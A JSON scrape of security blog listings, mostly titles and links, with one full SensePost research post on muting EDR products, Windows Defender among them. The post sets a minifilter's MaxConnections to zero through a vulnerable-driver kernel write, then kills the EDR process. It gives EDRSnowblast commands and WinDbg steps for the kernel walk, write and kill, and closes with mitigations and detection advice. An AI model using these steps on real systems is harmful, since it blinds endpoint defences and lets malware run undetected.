{
    "brief": "None<br> ",
    "html_url": "https://blog.compass-security.com/2023/07/lenovo-update-your-privileges/",
    "text": null,
    "title": "Lenovo Update Your Privileges"
}
{
    "brief": "None<br> ",
    "html_url": "https://sensepost.com/blog/2023/p4wnp1-lte/",
    "text": null,
    "title": "P4wnP1-LTE"
}
{
    "brief": "None<br> ",
    "html_url": "https://blog.compass-security.com/2023/07/relaying-ntlm-to-mssql/",
    "text": null,
    "title": "Relaying NTLM to MSSQL"
}
{
    "brief": "None<br> ",
    "html_url": "https://sensepost.com/blog/2023/browsers-cache-smuggling/",
    "text": null,
    "title": "Browsers’ cache smuggling"
}
{
    "brief": "None<br> ",
    "html_url": "https://sensepost.com/blog/2023/orange-cyberdefense-at-hacker-summer-camp/",
    "text": null,
    "title": "Orange Cyberdefense at Hacker Summer Camp"
}
{
    "brief": "None<br> ",
    "html_url": "https://sensepost.com/blog/2023/select-from-projectdiscovery-join-steampipe/",
    "text": null,
    "title": "select * from projectdiscovery join steampipe"
}
{
    "brief": "For example EDR_Driver.sys could subscribe to the “new process creation” notification service using the Windows API named PsSetCreateProcessNotifyRoutine which then, for each process created by the system, the driver will receive information about it (parent PID, command line, etc) The user double-clicks on malware.exe Windows calls the CreateProcessW API in order to load malware.exe into memory EDR_Driver.sys is notified that malware.exe **will be** spawned.<br> \nA new process called malware.exe will be started soon.” EDR_process.exe can choose to take action (or not): “Ok I will monitor this process by creating hooks in its ntdll.dll” When malware.exe runs, it calls the Windows API.<br> \nWe could take the piece of code below from ired.team as an example of malware.exe.<br> \nFrom Windows kernel memory space, EDR_Driver.sys could use several Windows Kernel API’s (callbacks) to monitor and then block the malicious system activities.<br> \nBecause we only focus on kernel part of EDR, here is a visualisation on what happens when you remove kernel callbacks:<br> \nWe won’t go into details on this topic, it’s covered in the blogpost Blinding EDR On Windows from Zach Stein.<br> \nThe first prerequisite for this step is to have a kernel-mode read / write primitive that we can use to set the value to 0.<br> \nLet’s take a look at how we can get this address!<br> \nThis is a bit long for the middle of the blogpost, but if you’re curious and want to know how to do this using Windbg, check out the EXTRA MILE section at the end: “kernel walking, 10 steps to get access to MaxConnections”<br> \nPersonally I do this operation using a my own tool (unsigned evil driver) which allows us to kill a process even if it’s protected, but it’s also possible to use Process Hacker (if not denylisted) or even better any exploitable “process killer drivers”.<br> \nUsing this we can test if our “filter-mute technique” could be useful.<br> \n(HR=0x%08X)\\n\", hr); if (hr == 0x800704D6) { printf(\"ERROR_CONNECTION_COUNT_LIMIT : A connection to the server could not be made because the limit on the number of concurrent connections for this account has been reached.\\n\"); } } // Other common errors you should check are // ERROR_BAD_PATHNAME (HR=0x800700A1) // E_FILE_NOT_FOUND (HR=0x80070002) // E_ACCESSDENIED (HR=0x80070005) // ERROR_INVALID_NAME (HR=0x8007007B) Static KDP: an EDR driver should call the MmProtectDriverSection API for protecting a section of its image Dynamic KDP: allows a driver to allocate and initialise read-only memory using services provided by a secure pool, which is managed by the secure kernel, using ExAllocatePool3 API.<br> \nWant to know how to get MaxConnections value?<br> \nThe method below shows how to get the MaxConnections value of the driver named bindflt.sys using Windbg.<br> \nYou can get the address directly:<br> \nStep 6 – compute the First filter address (Base of FLTMGR!_FLT_FILTER): 0xffffca0c386e8010<br> \nkd> .formats poi(ffffca0c`3eaf7430)<br> \nYou got it!<br> \nand<br> \nkd> !process 0 0 MsMpEng.exe PROCESS ffffa40a23a5f340<br> \nBecause it was a nightmare for me to visualise where I am in kernel memory, what are the fields of the data structures, the links between data structures, what offsets should I use, etc I made the map below (which also includes Windbg commands).<br> ",
    "html_url": "https://sensepost.com/blog/2023/filter-mute-operation-investigating-edr-internal-communication/",
    "text": "For our annual internal hacker conference dubbed SenseCon in 2023, I decided to take a look at communication between a Windows driver and its user-mode process. Here are some details about that journey.\n\nTL;DR\n\nAttackers could use Windows kernel R/W exploit primitive to avoid communication between EDR_Driver.sys and its EDR_process.exe. As a result some EDR detection mechanisms will be disabled and make it (partially) blind to malicious payloads. This blogpost describes an alternative approach which doesn’t remove kernel callbacks and gives some recommendations for protecting against this “filter-mute” attack.\n\nOverview of EDR_process.exe and EDR_Driver.sys roles\n\nThe first question that comes to mind is how does a EDR application (EDR_Process.exe) communicate with its EDR driver (EDR_Driver.sys)?\n\nBefore doing research we must know some EDR basics; how does an EDR agent hook / inject its own DLL during process creation?\n\nThe Process Injection via Callbacks schemas taken from EDR Observations made by Christopher Vella is a good summary.\n\nI have added some comments on what’s happening:\n\nEDR_Driver.sys can subscribe to several kinds of kernel notifications. You can imagine those notifications are like “newsletters” you subscribe to on the Internet and receive by email from a website. For example EDR_Driver.sys could subscribe to the “new process creation” notification service using the Windows API named PsSetCreateProcessNotifyRoutine which then, for each process created by the system, the driver will receive information about it (parent PID, command line, etc)\nThe user double-clicks on malware.exe\nWindows calls the CreateProcessW API in order to load malware.exe into memory\nEDR_Driver.sys is notified that malware.exe **will be** spawned.\nEDR_Driver.sys sends a log to EDR_Process.exe saying “Hey! A new process called malware.exe will be started soon.”\nEDR_process.exe can choose to take action (or not): “Ok I will monitor this process by creating hooks in its ntdll.dll”\nWhen malware.exe runs, it calls the Windows API. Thanks to the hooks in place, EDR_Process.exe knows which APIs are called and can deduce what this malware.exe is doing\n\nWe could take the piece of code below from ired.team as an example of malware.exe.\n\nOnce hooks are in place, the EDR agent (EDR_process.exe) can monitor / analyse malware.exe. Here is an example of actions it could take:\n\n1. EDR_Process.exe sees the following Windows API calls that are called by malware.exe:\n\nOpenProcess\nVirtualAllocEx\nWriteProcessMemory\nCreateRemoteThread\n\n2. EDR_Process.exe classifies this API call sequence as “malicious” and blocks (kills) the process.\n\n3. EDR_Process.exe sends a log to the EDR_C2 (security console) saying “Hey, malware.exe process spawned and is classified as malicious”.\n\nNote: this is a common EDR flow and not the only way it could work, for example EDR_Process.exe may only send telemetry data and let the EDR_C2 decide if it’s malicious and the action to be applied (block or not).\n\nIf the EDR vendor or the security team operators (aka blueteam) configured a “block if malicious” rule in the EDR Security Console then the malware.exe process is killed by EDR_Process.exe (or EDR_Driver.sys). Other countermeasures are also available, for example:\n\nthe Windows host could be remotely isolated from the network\nmalware.exe file or memory dump could be downloaded for analysis / reversing\nsecurity analyst could run commands on the Windows host (from the security console) for investigation purpose\n…\n\nThis point is an important one; the more experienced the blueteam is in creating custom rules, the more difficult for attackers to evade or move laterally into the network without being caught!\n\nNow before digging into internal communication, I want to take a step back and simplify the EDR behaviour. Internal communication (blue arrows) and external communication (yellow arrows) of the EDR_Process.exe could be visualised with a simple overview:\n\nDigging into EDR internal communication\n\nFrom Windows kernel memory space, EDR_Driver.sys could use several Windows Kernel API’s (callbacks) to monitor and then block the malicious system activities. For example the API PsSetCreateProcessNotifyRoutine routine could be used to generate the following “monitoring logs” messages thanks to the kernel callback mechanism:\n\n– Log = new process created (PID 5376) with cmd Line C:\\notepad.exe\n\nFrom usermode memory space, EDR_Process.exe could send action requests to the driver and receive information from it. For example an “Action request” coming from EDR security console could be:\n\n– Action = denylist C:\\notepad.exe\n\nIn the figure below I tried to map common Windows Kernel callbacks used for monitoring purposes.\n\nThe question which comes to mind after making this summary was how to avoid communication between EDR_process.exe and EDR_driver.sys?\n\nBlinding EDR using known techniques\n\nThe most common techniques for blinding EDR sensors are:\n\nRemoving the DLL hooks (userland)\nRemoving the kernel callbacks (kernel land)\n\nBecause we only focus on kernel part of EDR, here is a visualisation on what happens when you remove kernel callbacks:\n\nBEFORE zero out of the EDR callback address:\n\nAFTER zero out of the EDR callback address:\n\nWe won’t go into details on this topic, it’s covered in the blogpost Blinding EDR On Windows from Zach Stein.\n\nBut you may notice in the figure below that each time you zero out the EDR callback address it means no more notifications (no “newsletter”) will be sent from Windows to EDR_Driver.sys. In the end, no event log will be sent to EDR_Process.exe (and security analyst console) anymore!\n\nBlinding EDR using an alternative approach\n\nDuring my research on this topic I was wondering how to avoid communication between EDR_process.exe and EDR_driver.sys without any callback modification ? Could we prevent EDR_process.exe and EDR_Driver.sys from exchanging “messages”?\n\nLike I said before, we want to stay on the kernel side of the story. We could imagine this other approach using this graphical representation:\n\nWhile I was trying to investigate using Windbg, Yarden Shafir wrote an awesome blog on Investigating Filter Communication Ports which really helped. I discovered some Windows data structures being manipulated during communication setup between an application and a driver.\n\nThe data structure named FLT_SERVER_PORT_OBJECT drew my attention because it seemed to contain interesting fields, see if you agree:\n\nWhen I saw this, the first question which came to my mind was what could happen if we set MaxConnections to zero?\n\nThis data structure is initialised using the Windows Drivers API named FltCreateCommunicationPort:\n\nNTSTATUS FLTAPI FltCreateCommunicationPort(\n  [in]           PFLT_FILTER            Filter,\n  [out]          PFLT_PORT              *ServerPort,\n  [in]           POBJECT_ATTRIBUTES     ObjectAttributes,\n  [in, optional] PVOID                  ServerPortCookie,\n  [in]           PFLT_CONNECT_NOTIFY    ConnectNotifyCallback,\n  [in]           PFLT_DISCONNECT_NOTIFY DisconnectNotifyCallback,\n  [in, optional] PFLT_MESSAGE_NOTIFY    MessageNotifyCallback,\n  [in]           LONG                   MaxConnections\n);\n\nMicrosoft documentation gives the following information:\n\nWhat could we deduce? If we are able to reset MaxConnections to zero, it will only prevent new connections from happening. Let’s go for the following attack plan:\n\nStep 1: reset MaxConnections value\nStep 2: force EDR_Process.exe to restart (should require high privileges, probably NT SYSTEM)\nStep 3: observe EDR behaviour\nStep 1: reset MaxConnections value\n\nThe first prerequisite for this step is to have a kernel-mode read / write primitive that we can use to set the value to 0. We will use BYOVD (Bring Your Own Vulnerable Driver) technique for this. As a second prerequisite we have to find the address of MaxConnections field in kernel memory right? Let’s take a look at how we can get this address!\n\nThe structure fltmgr!_FLT_SERVER_PORT_OBJECT we discussed previously could be reached by the structure fltmgr!_FLT_FILTER, which could be reached by the structure fltmgr!_FLTP_FRAME, which could be reached by the structure FLTMGR!_GLOBALS, which could be reached by the FltMgr.sys driver. The base address of this kernel module can be retrieved from userland using NtQuerySystemInformation Windows API.\n\nI agree with Alex Ionescu when he said “I got 99 problems but a kernel pointer ain’t one” :-). We can find MaxConnections address by walking through Windows kernel data structures, starting from FltMgr.sys driver up to this field!\n\nThis is a bit long for the middle of the blogpost, but if you’re curious and want to know how to do this using Windbg, check out the EXTRA MILE section at the end: “kernel walking, 10 steps to get access to MaxConnections”\n\nHere is what it looks like when you want to have a look at details concerning Windows Defender kernel driver:\n\nWith knowledge of the MaxConnections memory location, we can use a kernel-mode read primitive to get the current value, and using a kernel-mode write primitive we can set the value to 0.\n\nStep 2: force EDR to restart\n\nThis phase could be difficult because EDR_Process.exe does its utmost to protect itself. Usually this program is started as a service and it will respawn after it dies but we don’t care since no connection is allowed by EDR_Driver.sys thanks to step 1 ;-)\n\nPersonally I do this operation using a my own tool (unsigned evil driver) which allows us to kill a process even if it’s protected, but it’s also possible to use Process Hacker (if not denylisted) or even better any exploitable “process killer drivers”. I highly recommend the blogpost by Alice Climent-Pommeret (@AliceCliment) Finding and exploiting process killer drivers with LOL for 3000$ which covers this topic!\n\nStep 3: observe EDR behaviour\n\nLet’s create a malware (code base available on ired.team) named `iwanttobeflag.exe` that will trigger Windows Defender:\n\nWe can then test the default reaction to our malware by copying the malicious payload from a share to the local disk. This raises an alert and is blocked by Windows Defender as expected: great!\n\ncopy z:\\iwanttobeflag.exe c:\\\n\nNow we have something that would in general cause an alert that we can use to test if our technique mutes the EDR. Using this we can test if our “filter-mute technique” could be useful.\n\nImplementing the Plan\n\nLets put this all together into a tool and test if our steps 1 and 2 can disrupt the alert caused in step 3.\n\nI love the EDRSandblast tool made by Thomas DIOT (Qazeer) and Maxime MEIGNAN (@th3m4ks), it’s really amazing. I opened a pull requests / issue but I don’t know if the project is maintained. This led me to starting my own project named EDRSnowblast in order to implement this “minifilter driver mute technique“. More details on this project is available at https://v1k1ngfr.github.io/edrsnowblast/.\n\nLets walk through the steps on a live machine and see what happens!\n\n1. enumerate drivers (filters) which are loaded in the kernel memory and identify Windows Defender : WdFilter at index 9 in the figure below\n\nEDRSnowblast.exe filter-enum --kernelmode\n\n2. retrieve details on WdFilter filter: for example MaxConnections & NumberOfConnections\n\nEDRSnowblast.exe filter-enum --kernelmode --filter-index 9\n\n3. mute WdFilter: set MaxConnections to zero\n\nEDRSnowblast.exe filter-mute --kernelmode --filter-index 9\n\n4. (optional) verify MaxConnections value using the –filter-enum option as seen previously\n\n5. identify the PID of Windows Defender usermode process and kill it\n\ntasklist | findstr MsMpEng.exe\nMsMpEng.exe                   2956 Services                   0    206,788 K\nc:\\pimpmypid_clt.exe /kill 2956\n\n6. copy our malicious payload created in step 3 and execute\n\ncopy z:\\iwanttobeflag.exe c:\\\nc:\\iwanttobeflag.exe\n\n7. bask in our success\n\nIf you prefer, you can watch the live demo video below.\n\nThis technique was successfully tested against Windows Defender and two other EDR vendors.\n\nHow to protect / detect ?\n\nWe must start by asking what are the “filter-mute” pre-requisites ?\n\nyou must use a Windows kernel R/W exploit primitive – if you want to use BYOVD (Bring Your Own Vulnerable Driver) you must have SeLoadDriverPrivilege, necessary for loading / unloading drivers (ex: local administrator, domain admin, domain print operator)\nyou must be able to kill (or restart) the EDR usermode application\n\nNow we could wonder if is it possible for Windows users to protect themselves? and yes some mitigations exist. Here are some recommendations:\n\napply Windows patches: it removes vulnerabilities from Windows kernel & drivers\nuse Microsoft VBS (enable HVCI): as you may have noticed, the attack vector used is BYOVD. This vector has been known for a long time and Microsoft did a great job to mitigate this with virtualization-based security (VBS) features available in Windows 10, Windows 11, Windows Server 2016, and later. More details on VBS in the Microsoft documentation: Virtualization-based Security (VBS)\nuse Microsoft recommended driver block rules available here\nuse Sysmon or Sigma rules: a huge list of known-vulnerable drivers is available on www.loldrivers.io and this project provides those kind of rules\n\nAnother question is: Can EDR vendors protect their drivers against this attack? Yes they can!\n\nThe fastest solution could be denylisting known-vulnerable drivers, avoiding them to be loaded. But this method has the same limitations as AV signatures; unknown vulnerable drivers won’t be blocked.\n\nBetter protections could be implemented by developers:\n\nalways verify that EDR_process.exe is able to connect to EDR_driver.sys communication port. An example of code that could achieve this:\nHANDLE hPort;\nHRESULT hr = ::FilterConnectCommunicationPort(L\"\\\\secureEDR\",0, nullptr, 0, nullptr, &hPort);\n\nif (FAILED(hr)) {\n   printf(\"Error connecting to EDR_driver.sys ! (HR=0x%08X)\\n\", hr);\n   if (hr == 0x800704D6) {\n      printf(\"ERROR_CONNECTION_COUNT_LIMIT : A connection to the server could not be made because the limit on the number of concurrent connections for this account has been reached.\\n\");\n   }\n}\n// Other common errors you should check are\n// ERROR_BAD_PATHNAME (HR=0x800700A1)\n// E_FILE_NOT_FOUND (HR=0x80070002)\n// E_ACCESSDENIED (HR=0x80070005)\n// ERROR_INVALID_NAME (HR=0x8007007B)\nStatic KDP: an EDR driver should call the MmProtectDriverSection API for protecting a section of its image\nDynamic KDP: allows a driver to allocate and initialise read-only memory using services provided by a secure pool, which is managed by the secure kernel, using ExAllocatePool3 API.\n\nMore details on KDP in the post from Andrea Allievi: Introducing Kernel Data Protection\n\nResources and acknowledgments\n\nI would like to give you the most relevant resources used during this journey and also thanks those people helping this research to be easier.\n\nThank you for sharing your knowledge with the community!\n\n– Yarden Shafir (@yarden_shafir) for the blog – Investigating Filter Communication Ports\n\n– Christopher Vella (@kharosx0) for the talk – CrikeyCon 2019 talk – Reversing & bypassing EDRs\n\n– Zach Stein (@synzack21) for the blog – Blinding EDR On Windows\n\n– Alexandre Borges (@ale_sp_brazil) for the 109 pages (!) – Exploiting Reversing (ER) series\n\n– Pavel Yosifovich (@zodiacon) for the book – Windows Kernel Programming\n\n– Alex Ionescu (@aionescu) for the talks – REcon 2013 – I got 99 problems but a kernel pointer ain’t one\n\n– Connor McGarr (@33y0re) for the blog – Exploit Development: No Code Execution? No Problem! Living The Age of VBS, HVCI, and Kernel CFG\n\nI hope you learnt something, thanks for reading!\n\nEXTRA MILE: “kernel walking, 10 steps to get access to MaxConnections”\n\nAlright you’re curious, the hacker spirit is great! Want to know how to get MaxConnections value? The method below shows how to get the MaxConnections value of the driver named bindflt.sys using Windbg. As a reminder / help, please find the hiking map below.\n\nTL;DR: the full solution is available in the map at the end of this section\n\nStep 0 – Identify the entry point\n\nThe starting point is the structure named FLTMGR!FltGlobals. You can get the address directly:\n\nkd> ? FLTMGR!FltGlobals\n\nBut if you need to retrieve this address using a memory leak, this path works like a charm:\n\n– get fltmgr.sys start address\n\nlmdvm fltmgr\n\n– get FltEnumerateFilters function offset, and in this function the offset of lea rcx, [FLTMGR!FltGlobals+0x58] instruction\n\nu FLTMGR!FltEnumerateFilters L15\n\n– compute FLTMGR!FltGlobals start address: 0xfffff8061ea8b600\n\n? fffff806`1ea8b658 - 0x58\n\nStep 1 – compute the FrameList field address stored in FLTMGR!FltGlobals: 0xfffff8061ea8b6c0\n\nkd> ? fffff806`1ea8b600 + 0x58 + 0x68\n\nStep 2 – use pointer indirection and get the first frame (Links filed) address in FLTMGR!_FLTP_FRAME: 0xffffca0c38c61058\n\nkd> ? poi(fffff806`1ea8b6c0)\n\nStep 3 – compute the First frame start address: 0xffffca0c38c61050\n\nkd> ? ffffca0c`38c61058 - 0x008\n\nStep 4 – compute the Filter List address: 0xffffca0c38c61100\n\nkd> ? ffffca0c`38c61050 + 0x48 + 0x68 + 0x000\n\nStep 5 – use pointer indirection and get the First filter (PrimaryLink field) address: 0xffffca0c386e8020\n\nkd> ? poi(ffffca0c`38c61100)\n\nStep 6 – compute the First filter address (Base of FLTMGR!_FLT_FILTER): 0xffffca0c386e8010\n\nkd> ? ffffca0c`386e8020 - 0x010\n\nOk nice we can verify and visualize where we are using Windbg filter kernel debugger (fltkd) command named frames:\n\nStep 7 – compute the Server Ports List address: 0xffffca0c386e8250\n\nkd> ? ffffca0c`386e8010 + 0x208 + 0x038 + 0x000\n\nStep 8 – use pointer indirection and get the First Server Ports Object address (FLTMGR!_FLT_SERVER_PORT_OBJECT FilterLink address): 0xffffca0c3eaf73f0\n\nkd> ? poi(ffffca0c`386e8250)\n\nStep 9 – compute the MaxConnections field address: 0xffffca0c3eaf7430\n\nkd> ? ffffca0c`3eaf73f0 +0x040\n\nStep 10 – use pointer indirection and get the MaxConnections value: 1000\n\nkd> .formats poi(ffffca0c`3eaf7430)\n\nor\n\nkd> dt _FLT_SERVER_PORT_OBJECT ffffca0c`3eaf73f0\n\nFinally! You got it!\n\nFinal steps – set the MaxConnections value to zero and kill EDR_Process.exe\n\nkd> eq 0xffffca0c3eaf7430 0\n\nand\n\nkd> !process 0 0 MsMpEng.exe\nPROCESS ffffa40a23a5f340\n\nkd> .kill ffffa40a23a5f340\n\nBecause it was a nightmare for me to visualise where I am in kernel memory, what are the fields of the data structures, the links between data structures, what offsets should I use, etc I made the map below (which also includes Windbg commands).\n\nMaybe (as I did) are you wondering what are those values used in computations: yes those are offsets.\n\nOffsets could change after Windows updates, personally I use a customised version of EDRSandblast’s ExtractOffsets.py script (available in EDRSnowblast). Output example is shown below.\n\nBecause we know the method and the offsets, we can automate this! PoC or GTFO, the code to do so can be found at EDRSnowblast.\n\nHappy hacking!",
    "title": "Filter-Mute Operation: Investigating EDR Internal Communication"
}
